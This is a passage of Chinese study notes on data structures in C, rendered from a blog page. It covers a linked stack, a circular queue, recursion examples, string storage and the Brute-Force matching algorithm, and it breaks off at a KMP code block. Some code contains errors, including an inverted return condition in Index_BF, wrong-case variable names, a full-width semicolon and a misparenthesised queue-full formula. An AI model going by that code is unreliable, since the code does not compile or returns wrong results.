class="built_in">malloc</span>(<span class="keyword">sizeof</span>(NODE));</span><br><span class="line">    <span class="keyword">if</span>(<span class="literal">NULL</span> == pS-&gt;pTop)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"动态内存分配失败！\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {<span class="comment">//创建一个空栈</span></span><br><span class="line">        pS-&gt;pBottom = pS-&gt;pTop;</span><br><span class="line">        pS-&gt;pBottom-&gt;pNext = <span class="literal">NULL</span>; <span class="comment">//也可写pS-&gt;pTop-&gt;pNext = NULL;</span></span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">push</span><span class="params">(PSTACK pS,<span class="type">int</span> val)</span></span><br><span class="line">{</span><br><span class="line">    PNODE pNew = (PNODE)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(NODE));</span><br><span class="line"></span><br><span class="line">    pNew-&gt;data = val;</span><br><span class="line">    pNew-&gt;pNext = pS-&gt;pTop; <span class="comment">//pS-&gt;pTop不能改成pS-&gt;pBottom</span></span><br><span class="line">    pS-&gt;pTop = pNew;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">traverse</span><span class="params">(PSTACK pS)</span></span><br><span class="line">{</span><br><span class="line">    PNODE p = pS-&gt;pTop;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(p != pS-&gt;pBottom)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d "</span>,p-&gt;data);</span><br><span class="line">        p = p-&gt;pNext;</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断栈是否为空</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">empty</span><span class="params">(PSTACK pS)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span>(pS-&gt;pTop == pS-&gt;pBottom)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//把pS所指向的栈出栈，并把出栈的元素存入pVal形参所指向的变量中，如果出栈失败，返回false，否则返回true</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">pop</span><span class="params">(PSTACK pS, <span class="type">int</span> * pVal)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span>( empty(pS) ) <span class="comment">//pS本身存放的就是S的地址</span></span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        PNODE r = pS-&gt;pTop;</span><br><span class="line">        * pVal = r-&gt;data;</span><br><span class="line">        pS-&gt;pTop = r-&gt;pNext;</span><br><span class="line">        <span class="built_in">free</span>(r);</span><br><span class="line">        r = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//clear清空</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">clear</span><span class="params">(PSTACK pS)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span>(empty(pS))</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        PNODE p = pS-&gt;pTop;</span><br><span class="line">        PNODE q = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(p != pS-&gt;pBottom)</span><br><span class="line">        {</span><br><span class="line">            <span class="comment">//q永远是p的下个元素，最后p,q都指向了头结点</span></span><br><span class="line">            q = p-&gt;pNext;</span><br><span class="line">            <span class="built_in">free</span>(p);</span><br><span class="line">            p = q;</span><br><span class="line">        }</span><br><span class="line">        pS-&gt;pTop = pS-&gt;pBottom;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure><img src="/posts/79666db/2.3.1.jpg" class="" title="头插式链表造栈"><h2 id="2-4-线性结构的两种常见应用之二-队列"><a href="#2-4-线性结构的两种常见应用之二-队列" class="headerlink" title="2.4 线性结构的两种常见应用之二 队列"></a>2.4 线性结构的两种常见应用之二 队列</h2><ul><li><p>定义：一种可以实现“先进先出”的存储结构</p></li><li><p>分类</p><ul><li><p>链式队列——用链表实现</p></li><li><p>静态队列——用数组实现</p><ol><li><p>静态队列通常都必须是循环队列</p></li><li><p>循环队列的讲解</p><ul><li><p>静态队列为什么必须是循环队列</p><blockquote><p>如果不是循环队列，静态队列(数组)里的空间只能使用一次</p></blockquote></li><li><p>循环队列需要几个参数来确定</p><blockquote><p>需要两个参数来确定队列，front 和 rear</p></blockquote></li><li><p>循环队列各个参数的含义</p><blockquote><ol><li>队列初始化：front和rear的值都是0</li><li>队列非空：<strong>front代表的是队列的第一个元素，rear代表的是队列的最后一个有效元素的下一个位置</strong></li><li>队列空：front和rear的值相等，但不一定是0</li></ol></blockquote></li><li><p>循环队列入队伪算法</p><blockquote><ol><li>将值存入rear所代表的位置</li><li>rear = (rear + 1) % 数组的长度</li></ol></blockquote></li><li><p>循环队列出队伪算法</p><blockquote><ol><li>front = (front + 1) % 数组的长度</li></ol></blockquote></li><li><p>如何判断循环队列是否为空</p><blockquote><p>if (front == rear)</p></blockquote></li><li><p>如何判断循环队列是否已满</p><blockquote><p>两种方式：</p><ol><li>if ((rear + 1 % 数组的长度) == front)（通常使用这种方式）</li><li>元素个数 = 数组长度 - 1</li></ol></blockquote></li></ul></li><li><p>队列的具体应用：<strong>所有和时间有关的操作都与队列有关</strong></p></li></ol></li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Queue</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    <span class="type">int</span> * pBase;</span><br><span class="line">    <span class="type">int</span> front;</span><br><span class="line">    <span class="type">int</span> rear;</span><br><span class="line">}QUEUE;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">(QUEUE *)</span>;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">en_queue</span><span class="params">(QUEUE *, <span class="type">int</span>)</span>; <span class="comment">//入队</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">traverse_queue</span><span class="params">(QUEUE *)</span>;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">full_queue</span><span class="params">(QUEUE *)</span>;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">out_queue</span><span class="params">(QUEUE *, <span class="type">int</span> *)</span>;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">emput_queue</span><span class="params">(QUEUE *)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    QUEUE Q;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line"></span><br><span class="line">    init(&amp;Q);</span><br><span class="line">    en_queue(&amp;Q, <span class="number">1</span>);</span><br><span class="line">    en_queue(&amp;Q, <span class="number">2</span>);</span><br><span class="line">    en_queue(&amp;Q, <span class="number">3</span>);</span><br><span class="line">    en_queue(&amp;Q, <span class="number">4</span>);</span><br><span class="line">    en_queue(&amp;Q, <span class="number">5</span>);</span><br><span class="line">    en_queue(&amp;Q, <span class="number">6</span>);</span><br><span class="line">    en_queue(&amp;Q, <span class="number">7</span>);</span><br><span class="line">    en_queue(&amp;Q, <span class="number">8</span>);    </span><br><span class="line">    traverse_queue(&amp;Q);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( out_queue(&amp;Q, &amp;val) )</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"出队成功，队列出队的元素是：%d\n"</span>, val);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"出队失败！\n"</span>);</span><br><span class="line">    traverse_queue(&amp;Q);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">(QUEUE *pQ)</span></span><br><span class="line">{</span><br><span class="line">    pQ-&gt;pBase = (<span class="type">int</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * <span class="number">6</span>);</span><br><span class="line">    pQ-&gt;front = <span class="number">0</span>;</span><br><span class="line">    pQ-&gt;rear = <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">full_queue</span><span class="params">(QUEUE * pQ)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span>( (pQ-&gt;rear + <span class="number">1</span>) % <span class="number">6</span> == pQ-&gt;front )</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">en_queue</span><span class="params">(QUEUE * pQ, <span class="type">int</span> val)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span>( full_queue(pQ) )</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        pQ-&gt;pBase[pQ-&gt;rear] = val;</span><br><span class="line">        pQ-&gt;rear = (pQ-&gt;rear + <span class="number">1</span>) % <span class="number">6</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    } </span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">traverse_queue</span><span class="params">(QUEUE * pQ)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> i = pQ-&gt;front;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(i != pQ-&gt;rear)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d "</span>, pQ-&gt;pBase[i]);</span><br><span class="line">        i = (i+<span class="number">1</span>) % <span class="number">6</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断队列是否为空</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">emput_queue</span><span class="params">(QUEUE * pQ)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span>( pQ-&gt;front == pQ-&gt;rear)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">out_queue</span><span class="params">(QUEUE * pQ, <span class="type">int</span> * pVal)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span> ( emput_queue(pQ) )</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        *pVal = pQ-&gt;pBase[pQ-&gt;front];</span><br><span class="line">        pQ-&gt;front = (pQ-&gt;front + <span class="number">1</span>) % <span class="number">6</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">}</span><br></pre></td></tr></table></figure><h2 id="2-5-递归"><a href="#2-5-递归" class="headerlink" title="2.5 递归"></a>2.5 递归</h2><p>定义：一个函数自己直接或间接调用自己</p><p>递归满足三个条件：</p><ol><li>递归必须得有一个明确的中止条件</li><li>该函数所处理的数据规模必须在递减</li><li>这个转化必须是可解的</li></ol><p>循环和递归的区别：</p><ul><li>递归<ul><li>易于理解</li><li>速度慢</li><li>存储空间大</li></ul></li><li>循环<ul><li>不易理解</li><li>速度快</li><li>存储空间小</li></ul></li></ul><p>函数的调用：</p><ul><li>当在一个函数的运行期间调用另一个函数时，在运行被调函数之前，系统需要完成三件事：<ol><li>将所有的实际参数、返回地址等信息传递给被调函数保存。</li><li>为被调函数的局部变量（也包括行参）分配存储空间。</li><li>将控制转移到被调函数的入口。</li></ol></li><li>从被调函数返回函数之前，系统也要完成三件事：<ol><li>保存被调函数的返回结果。</li><li>释放被调函数所占的存储空间。</li><li>依照被调函数保存的返回地址将控制转移到调用函数。</li></ol></li><li>当有多个函数相互调用时，按照“后调用先返回”的原则，上述函数之间信息传递和控制转移必须借助“栈”来实现，即系统将整个程序运行时所需的数据空间安排在一个栈中，每当调用一个函数时，就在栈顶分配一个存储区，进行压栈操作，每当一个函数退出时，就释放它的存储区，就做出栈操作，当前运行的函数永远都在栈顶位置。</li><li>A函数调用A函数和A函数调用B函数在计算机看来是没有任何区别的，只不过用我们日常的思维方式理解比较怪异而已！</li></ul><p>递归的应用：</p><ul><li>树和森林就是以递归的方式定义的</li><li>树和图的很多算法</li><li>很多数学公式：例如斐波拉契数列</li></ul><h3 id="2-5-1-1-2-3-…-100的和"><a href="#2-5-1-1-2-3-…-100的和" class="headerlink" title="2.5.1 1+2+3+…+100的和"></a>2.5.1 1+2+3+…+100的和</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="title function_">sum</span><span class="params">(<span class="type">int</span> n)</span></span><br><span class="line">{</span><br><span class="line">    <span class="comment">//常量不能被赋值，所以如果误写成1 = n会报错</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="number">1</span> == n)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>；</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> n + sum(n<span class="number">-1</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%ld\n"</span>,sum(<span class="number">100</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure><h3 id="2-5-2-求阶乘"><a href="#2-5-2-求阶乘" class="headerlink" title="2.5.2 求阶乘"></a>2.5.2 求阶乘</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//假定n的值是1或大于1的值</span></span><br><span class="line"><span class="type">long</span> <span class="title function_">f</span><span class="params">(<span class="type">long</span> n)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span>( <span class="number">1</span> == n )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> f(n<span class="number">-1</span>) * n;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, f(<span class="number">5</span>));<span class="comment">//120</span></span><br><span class="line">    <span class="comment">//printf("%d\n", f(100));//0,因为超过long型的最大范围</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure><h3 id="2-5-3-汉诺塔"><a href="#2-5-3-汉诺塔" class="headerlink" title="2.5.3 汉诺塔"></a>2.5.3 汉诺塔</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">tower_of_hanoi</span><span class="params">(<span class="type">int</span> n, <span class="type">char</span> A, <span class="type">char</span> B, <span class="type">char</span> C)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    如果是1个盘子</span></span><br><span class="line"><span class="comment">        直接将A柱子上的盘子从A移到C</span></span><br><span class="line"><span class="comment">    否则</span></span><br><span class="line"><span class="comment">        先将A柱子上的n-1个盘子借助C移到B</span></span><br><span class="line"><span class="comment">        直接将A柱子上的盘子从A移到C</span></span><br><span class="line"><span class="comment">        最后将B柱子上的n-1个盘子借助A移到C</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="number">1</span> == n)</span><br><span class="line">        <span class="comment">//盘子从上往下编号</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"将编号为%d的盘子直接从%c柱子移到%c柱子\n"</span>, n, A, C);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        tower_of_hanoi(n<span class="number">-1</span>, A, C, B);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"将编号为%d的盘子直接从%c柱子移到%c柱子\n"</span>, n, A, C);</span><br><span class="line">        tower_of_hanoi(n<span class="number">-1</span>, B, A, C);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">char</span> ch1 = <span class="string">'A'</span>;</span><br><span class="line">    <span class="type">char</span> ch2 = <span class="string">'B'</span>;</span><br><span class="line">    <span class="type">char</span> ch3 = <span class="string">'C'</span>;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入要移动盘子的个数："</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line"></span><br><span class="line">    tower_of_hanoi(n,<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>);</span><br><span class="line">}</span><br></pre></td></tr></table></figure><h2 id="2-6-串"><a href="#2-6-串" class="headerlink" title="2.6 串"></a>2.6 串</h2><p>串中元素逻辑关系与线性表的相同，串可以采用与线性表相同的存储结构。串有顺序存储结构(顺序串)和链式存储结构(链串)。</p><h3 id="2-6-1-串的顺序存储结构"><a href="#2-6-1-串的顺序存储结构" class="headerlink" title="2.6.1 串的顺序存储结构"></a>2.6.1 串的顺序存储结构</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAXLEN 255</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    <span class="type">char</span> ch[MAXLEN + <span class="number">1</span>];<span class="comment">//存储串的一维数组</span></span><br><span class="line">    <span class="type">int</span> length;<span class="comment">//串的当前长度</span></span><br><span class="line">}SString;</span><br></pre></td></tr></table></figure><h3 id="2-6-2-串的链式存储结构——块链结构"><a href="#2-6-2-串的链式存储结构——块链结构" class="headerlink" title="2.6.2 串的链式存储结构——块链结构"></a>2.6.2 串的链式存储结构——块链结构</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNKSIZE 80<span class="comment">//块的大小由用户定义</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Chunck</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    <span class="type">char</span> ch[CHUNKSIZE];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Chunk</span> *<span class="title">next</span>;</span></span><br><span class="line">}Chunk;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    Chunk *head, *tail;<span class="comment">//串的头指针和尾指针</span></span><br><span class="line">    <span class="type">int</span> length;<span class="comment">//串的当前长度</span></span><br><span class="line">}LString;<span class="comment">//字符串的块链结构</span></span><br></pre></td></tr></table></figure><h3 id="2-6-3-串的模式匹配算法"><a href="#2-6-3-串的模式匹配算法" class="headerlink" title="2.6.3 串的模式匹配算法"></a>2.6.3 串的模式匹配算法</h3><p>算法目的：确定主串中所含子串(模式串)第一次出现的位置。</p><h4 id="2-6-3-1-BF算法"><a href="#2-6-3-1-BF算法" class="headerlink" title="2.6.3.1 BF算法"></a>2.6.3.1 BF算法</h4><p>Brute-Force简称为BF算法，亦称简单匹配算法。采用穷举法的思路。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAXLEN 255</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    <span class="type">char</span> ch[MAXLEN + <span class="number">1</span>];<span class="comment">//存储串的一维数组</span></span><br><span class="line">    <span class="type">int</span> length;<span class="comment">//串的当前长度</span></span><br><span class="line">}SString;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">Index_BF</span><span class="params">(SString S, SString T, <span class="type">int</span> pos)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> i=pos, j=<span class="number">1</span>;<span class="comment">//下标从1开始，下标0经常存储串的长度</span></span><br><span class="line">    <span class="keyword">while</span>(i&lt;=S.length &amp;&amp; j&lt;=T.length)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span>(s.ch[i] == t.ch[j])</span><br><span class="line">        {</span><br><span class="line">            i++;</span><br><span class="line">            j++;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        {</span><br><span class="line">            i = i - j + <span class="number">2</span>;<span class="comment">//i回到主串下一个字符</span></span><br><span class="line">            j = <span class="number">1</span>;<span class="comment">//j重头开始</span></span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span>(j&lt;=T.length)</span><br><span class="line">        <span class="keyword">return</span> i - T.length;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>时间复杂度：若n为主串长度，m为子串长度。</p><p>最好的情况是开头就是需要匹配的子串，所以时间复杂度为O(m)。</p><p>最坏情况是主串前面n-m个位置都部分匹配到子串的最后一位，即这n-m位各比较了m次，最后m位也各比较了1次。</p><script type="math/tex; mode=display">总次数为：(n-m)*m+1*m=(n-m+1)*m</script><p>若m&lt;&lt;n，则算法复杂度为O(n*m)。</p><h4 id="2-6-3-2-KMP算法"><a href="#2-6-3-2-KMP算法" class="headerlink" title="2.6.3.2 KMP算法"></a>2.6.3.2 KMP算法</h4><p><a href="https://www.bilibili.com/video/BV1jb411V78H">天勤率辉 KMP算法易懂版</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 